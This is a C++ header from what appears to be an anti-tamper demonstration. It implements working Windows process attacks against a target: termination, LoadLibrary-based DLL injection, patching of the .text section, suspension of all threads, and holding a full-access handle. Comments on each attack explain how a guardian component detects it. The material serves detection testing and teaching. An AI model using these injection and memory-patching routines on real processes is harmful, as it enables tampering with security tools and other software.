#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>

#include <chrono>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#include "AttackerUtils.hpp"

#pragma comment(lib, "psapi.lib")

namespace atk {

// ===========================================================================
// ATTACK 1: Terminate
//
// The simplest and most direct attack — open the process with PROCESS_TERMINATE
// and call TerminateProcess.
//
// Guardian detection mechanism: EtwSessionMonitor
//   ETW fires the moment OpenProcess is called, before TerminateProcess even
//   executes. This is the key point: the guardian gets the alert before the
//   damage is done. In a real agent, the response to this event would be to
//   revoke the handle or block the caller — here we just log it.
//
// Why PROCESS_TERMINATE specifically?
//   It's the minimum access right required to kill a process. An attacker
//   requesting PROCESS_ALL_ACCESS for a termination would be wasteful and
//   more detectable — though we'd catch either.
// ===========================================================================

inline bool attackTerminate(DWORD targetPid) {
    printStep("ATTACK: Process Termination");
    printInfo("Technique: OpenProcess(PROCESS_TERMINATE) + TerminateProcess");
    printInfo("Guardian detection: ETW Kernel-Object provider (handle acquisition)");
    std::cout << '\n';

    printStep("Opening target process with PROCESS_TERMINATE access...");
    printInfo("Note: ETW fires HERE — before we even attempt the kill");

    // This OpenProcess call is what the ETW monitor catches.
    HANDLE hTarget = OpenProcess(PROCESS_TERMINATE, FALSE, targetPid);
    if (!hTarget) {
        printFail("OpenProcess failed: " + formatError(GetLastError()));
        printInfo("This may mean the guardian is running as a protected process,");
        printInfo("or that we don't have sufficient privileges.");
        return false;
    }
    printOk("Handle acquired: 0x" + std::to_string(reinterpret_cast<uintptr_t>(hTarget)));

    // Brief pause so the ETW alert has time to appear in the guardian's console
    // before the process disappears — makes the demo more readable.
    printStep("Waiting 500ms (so ETW alert is visible before process exits)...");
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    printStep("Calling TerminateProcess...");
    BOOL ok = TerminateProcess(hTarget, 0xDEAD);
    CloseHandle(hTarget);

    if (ok) {
        printOk("TerminateProcess succeeded — target is dead");
        printWarn("Guardian should have logged an ETW alert before this happened");
    } else {
        printFail("TerminateProcess failed: " + formatError(GetLastError()));
    }

    return ok != FALSE;
}

// ===========================================================================
// ATTACK 2: DLL Injection (LoadLibrary technique)
//
// The classic injection technique:
//   1. Allocate memory in the target's virtual address space.
//   2. Write the path of our malicious DLL into that memory.
//   3. Create a remote thread with start address = LoadLibraryA.
//      Windows' loader runs in the target's context and maps the DLL.
//
// Guardian detection mechanism: ModuleWatchdog
//   On the next poll (up to poll-interval-ms later), EnumProcessModules will
//   include the new DLL, and it won't be in the whitelist.
//
// For a real demo: we inject a benign DLL (e.g. a freshly compiled
// payload.dll that just calls MessageBoxA and returns). The content of
// the DLL doesn't matter for detection — the module list change is enough.
//
// Detection latency: poll interval (default 1000ms).
// Compare to ETW: zero latency. This is a key architectural point.
// ===========================================================================

inline bool attackInject(DWORD targetPid, const std::wstring& dllPath) {
    printStep("ATTACK: DLL Injection (LoadLibrary technique)");
    printInfo("Technique: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryW)");
    printInfo("Guardian detection: ModuleWatchdog (poll-based, latency = poll interval)");
    printInfo("DLL to inject: " + std::string(dllPath.begin(), dllPath.end()));
    std::cout << '\n';

    // Step 1: Open with rights needed for allocation, writing, and thread creation.
    printStep("Opening target with VM_OPERATION | VM_WRITE | CREATE_THREAD...");
    printInfo("(ETW will also fire here for the handle acquisition)");

    HANDLE hTarget = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, targetPid);

    if (!hTarget) {
        printFail("OpenProcess failed: " + formatError(GetLastError()));
        return false;
    }
    printOk("Handle acquired");

    // Step 2: Allocate memory in the remote process for the DLL path string.
    size_t pathBytes = (dllPath.size() + 1) * sizeof(wchar_t);
    printStep("Allocating " + std::to_string(pathBytes) + " bytes in target for DLL path...");

    LPVOID remoteBuffer = VirtualAllocEx(
        hTarget, nullptr, pathBytes,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteBuffer) {
        printFail("VirtualAllocEx failed: " + formatError(GetLastError()));
        CloseHandle(hTarget);
        return false;
    }
    printOk("Remote buffer allocated at 0x" +
            std::to_string(reinterpret_cast<uintptr_t>(remoteBuffer)));

    // Step 3: Write the DLL path into the remote buffer.
    printStep("Writing DLL path into target memory via WriteProcessMemory...");

    SIZE_T written{};
    BOOL ok = WriteProcessMemory(hTarget, remoteBuffer,
                                  dllPath.c_str(), pathBytes, &written);
    if (!ok || written != pathBytes) {
        printFail("WriteProcessMemory failed: " + formatError(GetLastError()));
        VirtualFreeEx(hTarget, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return false;
    }
    printOk("DLL path written (" + std::to_string(written) + " bytes)");

    // Step 4: Get the address of LoadLibraryW in this process.
    // Since kernel32.dll is loaded at the same base address in every process
    // on the same Windows session (ASLR shifts the base at boot, but it's
    // consistent within a session), our LoadLibraryW address is valid in
    // the target too. This is a well-known property that injection relies on.
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    auto pfnLoadLibrary = reinterpret_cast<LPTHREAD_START_ROUTINE>(
        GetProcAddress(hKernel32, "LoadLibraryW"));

    printStep("Resolving LoadLibraryW address in kernel32.dll...");
    printInfo("Address: 0x" + std::to_string(reinterpret_cast<uintptr_t>(pfnLoadLibrary)));
    printInfo("(Valid in target because kernel32 loads at the same base in all processes)");

    // Step 5: Create a remote thread that calls LoadLibraryW(dllPath).
    printStep("Creating remote thread in target (start = LoadLibraryW, arg = dllPath)...");

    HANDLE hThread = CreateRemoteThread(
        hTarget, nullptr, 0,
        pfnLoadLibrary, remoteBuffer,
        0, nullptr);

    if (!hThread) {
        printFail("CreateRemoteThread failed: " + formatError(GetLastError()));
        VirtualFreeEx(hTarget, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return false;
    }

    printOk("Remote thread created — LoadLibraryW is executing in the target");
    printStep("Waiting for injection thread to complete...");
    WaitForSingleObject(hThread, 5000);

    DWORD exitCode{};
    GetExitCodeThread(hThread, &exitCode);
    printInfo("Thread exit code (= HMODULE of loaded DLL): 0x" + std::to_string(exitCode));

    CloseHandle(hThread);
    VirtualFreeEx(hTarget, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hTarget);

    if (exitCode == 0) {
        printFail("LoadLibrary returned NULL — DLL not found or failed to load");
        printInfo("Make sure payload.dll exists next to attacker.exe");
        return false;
    }

    printOk("Injection complete — DLL is now loaded in the target");
    printWarn("Guardian ModuleWatchdog will detect this on next poll");
    return true;
}

// ===========================================================================
// ATTACK 3: Memory Patch (WriteProcessMemory into .text)
//
// Locates the target's .text section and overwrites a small region with
// 0xCC bytes (INT3 — the x86 breakpoint instruction). In a real attack
// this would be crafted shellcode or a redirect to attacker-controlled code.
//
// We use 0xCC specifically because:
//   - It's a single byte, so alignment doesn't matter.
//   - It causes an immediate fault/exception if executed, making the effect
//     of the patch obvious in the demo.
//   - It's a classic technique for manual inline hooking.
//
// Guardian detection mechanism: MemoryIntegrityMonitor
//   On next poll, the FNV-1a hash of the .text section will differ from
//   the baseline and an integrity violation alert fires.
//
// NOTE: We first call VirtualProtectEx to make the .text section writable.
// By default, .text is PAGE_EXECUTE_READ — you cannot write to it.
// Changing permissions to PAGE_EXECUTE_READWRITE is itself a suspicious
// operation that a real EDR would flag via ETW kernel events.
// ===========================================================================

inline bool attackPatch(DWORD targetPid) {
    printStep("ATTACK: Memory Patch (.text section corruption)");
    printInfo("Technique: VirtualProtectEx + WriteProcessMemory into executable section");
    printInfo("Guardian detection: MemoryIntegrityMonitor (hash mismatch on next poll)");
    std::cout << '\n';

    printStep("Opening target with VM_READ | VM_WRITE | VM_OPERATION...");
    HANDLE hTarget = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION,
        FALSE, targetPid);

    if (!hTarget) {
        printFail("OpenProcess failed: " + formatError(GetLastError()));
        return false;
    }
    printOk("Handle acquired");

    // Find the base address of the main module (the EXE).
    HMODULE hMods[1]{};
    DWORD needed{};
    if (!EnumProcessModules(hTarget, hMods, sizeof(hMods), &needed)) {
        printFail("EnumProcessModules failed: " + formatError(GetLastError()));
        CloseHandle(hTarget);
        return false;
    }

    auto imageBase = reinterpret_cast<uintptr_t>(hMods[0]);
    printStep("Target image base: 0x" + std::to_string(imageBase));

    // Read the DOS header to get e_lfanew.
    IMAGE_DOS_HEADER dosHdr{};
    SIZE_T bytesRead{};
    ReadProcessMemory(hTarget, reinterpret_cast<LPCVOID>(imageBase),
                      &dosHdr, sizeof(dosHdr), &bytesRead);

    if (dosHdr.e_magic != IMAGE_DOS_SIGNATURE) {
        printFail("Invalid DOS header — not an MZ executable");
        CloseHandle(hTarget);
        return false;
    }

    // Read NT headers.
    IMAGE_NT_HEADERS64 ntHdr{};
    ReadProcessMemory(hTarget,
                      reinterpret_cast<LPCVOID>(imageBase + dosHdr.e_lfanew),
                      &ntHdr, sizeof(ntHdr), &bytesRead);

    if (ntHdr.Signature != IMAGE_NT_SIGNATURE) {
        printFail("Invalid NT signature");
        CloseHandle(hTarget);
        return false;
    }

    // Walk section headers to find .text.
    WORD numSections = ntHdr.FileHeader.NumberOfSections;
    WORD optSize     = ntHdr.FileHeader.SizeOfOptionalHeader;
    uintptr_t sectAddr = imageBase + dosHdr.e_lfanew
                       + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize;

    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    ReadProcessMemory(hTarget, reinterpret_cast<LPCVOID>(sectAddr),
                      sections.data(),
                      numSections * sizeof(IMAGE_SECTION_HEADER), &bytesRead);

    uintptr_t textVa   = 0;
    size_t    textSize = 0;
    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), ".text", 5) == 0) {
            textVa   = imageBase + sec.VirtualAddress;
            textSize = sec.Misc.VirtualSize;
            break;
        }
    }

    if (!textVa) {
        printFail("Could not find .text section");
        CloseHandle(hTarget);
        return false;
    }

    printOk(".text section found at 0x" + std::to_string(textVa) +
            ", size " + std::to_string(textSize) + " bytes");

    // Make the .text section writable.
    // PAGE_EXECUTE_READ → PAGE_EXECUTE_READWRITE.
    // This permission change is itself a red flag a real EDR would catch.
    printStep("Changing .text protection to PAGE_EXECUTE_READWRITE...");
    DWORD oldProtect{};
    if (!VirtualProtectEx(hTarget, reinterpret_cast<LPVOID>(textVa),
                           64, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printFail("VirtualProtectEx failed: " + formatError(GetLastError()));
        CloseHandle(hTarget);
        return false;
    }
    printOk("Protection changed (old: 0x" + std::to_string(oldProtect) + ")");

    // Write 64 bytes of 0xCC (INT3) into the start of .text.
    printStep("Writing 64 x 0xCC (INT3) bytes into .text section...");
    std::vector<BYTE> patch(64, 0xCC);
    if (!WriteProcessMemory(hTarget, reinterpret_cast<LPVOID>(textVa),
                             patch.data(), patch.size(), &bytesRead)) {
        printFail("WriteProcessMemory failed: " + formatError(GetLastError()));
        VirtualProtectEx(hTarget, reinterpret_cast<LPVOID>(textVa),
                         64, oldProtect, &oldProtect);
        CloseHandle(hTarget);
        return false;
    }

    // Restore original protection.
    VirtualProtectEx(hTarget, reinterpret_cast<LPVOID>(textVa),
                     64, oldProtect, &oldProtect);

    printOk("Patch written at 0x" + std::to_string(textVa));
    printWarn("Guardian MemoryIntegrityMonitor will detect hash mismatch on next poll");
    printInfo("The target process may crash when it next executes patched code");

    CloseHandle(hTarget);
    return true;
}

// ===========================================================================
// ATTACK 4: Thread Suspension
//
// Enumerate all threads belonging to the target and suspend each one.
// A fully suspended process is effectively frozen — it consumes no CPU,
// makes no progress, but the process object still exists and looks alive
// to a naive "is it running?" check.
//
// Guardian detection: HeartbeatMonitor
//   The target pushes a heartbeat message over a named pipe every 500ms.
//   When all threads are suspended, those beats stop. The HeartbeatMonitor's
//   watchdog thread notices the silence after ~2000ms (the silence threshold)
//   and fires a ThreadsSuspended event.
//
//   When threads are resumed, beats start flowing again and the watchdog
//   fires a HeartbeatRestored event.
//
// Why active push beats are better than a poll-ping approach:
//   A guardian that pings the target has a race window — if a ping is already
//   in-flight at the moment of suspension, the target might respond before
//   fully freezing. With a push model, the target must actively send each beat,
//   so the moment its threads stop, the beats stop. No race.
//
// Remaining blind spots (worth knowing for the interview):
//   - An attacker who can suspend threads could also patch our heartbeat sender
//     before suspending (inject a NOP over the send loop). This is harder but
//     possible, and is why real anti-tamper also uses kernel callbacks.
//   - The 2000ms threshold means a very brief suspension (<2s) might not alert.
//     Lowering the threshold increases false-positive risk from scheduler jitter.
// ===========================================================================

inline bool attackSuspend(DWORD targetPid) {
    printStep("ATTACK: Thread Suspension (freeze target without killing it)");
    printInfo("Technique: OpenThread(SUSPEND_RESUME) + SuspendThread for all threads");
    printInfo("Guardian detection: HeartbeatMonitor — silence threshold ~2000ms");
    printInfo("The target pushes a heartbeat every 500ms. Suspending its threads");
    printInfo("stops the beats. The guardian alerts after ~2s of silence.");
    std::cout << '\n';

    printStep("Enumerating threads belonging to PID " + std::to_string(targetPid) + "...");
    auto tids = getProcessThreadIds(targetPid);

    if (tids.empty()) {
        printFail("No threads found — is the target running?");
        return false;
    }
    printOk("Found " + std::to_string(tids.size()) + " thread(s)");

    int suspended = 0;
    for (DWORD tid : tids) {
        // THREAD_SUSPEND_RESUME is the only right needed.
        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, tid);
        if (!hThread) {
            printFail("  OpenThread(" + std::to_string(tid) + ") failed: " +
                      formatError(GetLastError()));
            continue;
        }

        // SuspendThread returns the previous suspend count (or -1 on failure).
        // A thread with suspend count > 0 will not be scheduled.
        DWORD prevCount = SuspendThread(hThread);
        if (prevCount == static_cast<DWORD>(-1)) {
            printFail("  SuspendThread(" + std::to_string(tid) + ") failed: " +
                      formatError(GetLastError()));
        } else {
            printOk("  Thread " + std::to_string(tid) +
                    " suspended (prev suspend count: " + std::to_string(prevCount) + ")");
            ++suspended;
        }

        CloseHandle(hThread);
    }

    if (suspended == 0) {
        printFail("Failed to suspend any threads");
        return false;
    }

    printOk(std::to_string(suspended) + " thread(s) suspended — target is now frozen");
    printWarn("Guardian HeartbeatMonitor will alert after ~2s of silence");
    printInfo("Watch the guardian console for the THREAD SUSPENSION DETECTED alert");
    printInfo("");
    printInfo("Resuming threads in 5 seconds...");
    std::this_thread::sleep_for(std::chrono::seconds(5));

    for (DWORD tid : tids) {
        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, tid);
        if (!hThread) continue;
        DWORD prev = ResumeThread(hThread);
        printInfo("  Thread " + std::to_string(tid) +
                  " resumed (prev suspend count was: " + std::to_string(prev) + ")");
        CloseHandle(hThread);
    }

    printOk("All threads resumed");
    printInfo("Guardian should now log HeartbeatRestored as beats resume");
    return true;
}

// ===========================================================================
// ATTACK 5: Handle Leak
//
// Acquire a high-privilege handle to the target and hold it open.
// Does not actively harm the target, but:
//   - ETW detects the OpenProcess immediately.
//   - The held handle represents a capability: the attacker can use it at any
//     point to terminate, inject, or read memory — without calling OpenProcess
//     again (which would generate another ETW event).
//   - Handle inheritance: if the attacker spawns a child process with
//     bInheritHandles=TRUE, the child inherits the handle silently.
//   - This simulates a real persistence technique: open the handle early,
//     park it in a long-running process, use it later.
//
// Guardian detection: ETW fires on the OpenProcess call (handle acquisition).
//   The guardian cannot detect that the handle is being held, only that it
//   was opened. In a real agent, the response would be to call
//   NtSetInformationProcess to revoke the handle — but that requires a
//   kernel driver.
// ===========================================================================

inline bool attackHandleLeak(DWORD targetPid) {
    printStep("ATTACK: Handle Leak (acquire and hold a dangerous handle)");
    printInfo("Technique: OpenProcess(PROCESS_ALL_ACCESS) — then just hold it");
    printInfo("Guardian detection: ETW fires on the OpenProcess call");
    printInfo("Purpose: demonstrates that detection != prevention in user-mode");
    std::cout << '\n';

    printStep("Opening target with PROCESS_ALL_ACCESS...");
    printInfo("(This is the most privileged handle you can request)");
    printInfo("ETW fires HERE — the guardian logs the acquisition");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hTarget) {
        printFail("OpenProcess failed: " + formatError(GetLastError()));
        printInfo("May need to run as Administrator, or target may have");
        printInfo("process protection enabled (PPL).");
        return false;
    }

    printOk("Handle acquired: 0x" +
            std::to_string(reinterpret_cast<uintptr_t>(hTarget)));

    printStep("Holding handle open for 10 seconds...");
    printInfo("During this time, we COULD terminate, inject, or patch at any moment");
    printInfo("without triggering another ETW event (handle already open).");
    printInfo("A guardian in kernel mode could call NtSetInformationProcess to revoke it.");

    for (int i = 10; i > 0; --i) {
        printInfo("  " + std::to_string(i) + "s remaining...");
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    CloseHandle(hTarget);
    printOk("Handle closed — attack window over");
    printWarn("Key insight: guardian detected the ACQUISITION but couldn't revoke the handle");
    printInfo("This is why kernel-mode protection (ObRegisterCallbacks) exists:");
    printInfo("it can intercept and strip access rights BEFORE the handle is returned.");

    return true;
}

} // namespace atk
